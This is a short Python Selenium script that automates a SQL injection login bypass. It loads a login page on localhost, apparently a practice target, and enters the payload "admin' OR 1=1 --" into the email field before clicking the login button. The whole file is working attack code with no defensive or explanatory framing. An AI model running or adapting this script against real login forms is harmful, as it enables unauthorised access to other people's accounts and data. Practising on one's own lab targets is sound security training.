import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys

def inject():
    #url and payload
    url = "http://localhost:3000/#/login"
    payload = "admin' OR 1=1 --"

    #initialize web session
    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
    driver.get(url)

    #initialize actions driver
    action = ActionChains(driver)

    #close intial pop up
    action.send_keys(Keys.ESCAPE).perform()

    #find the forms
    email_box = driver.find_element(By.ID, "email")
    password_box = driver.find_element(By.ID, "password")
    #find login button
    login_button = driver.find_element(By.ID, "loginButton")

    #send payload
    email_box.send_keys(payload)
    password_box.send_keys("admin")


    action.click(on_element=login_button)
    #click button
    action.perform()


inject()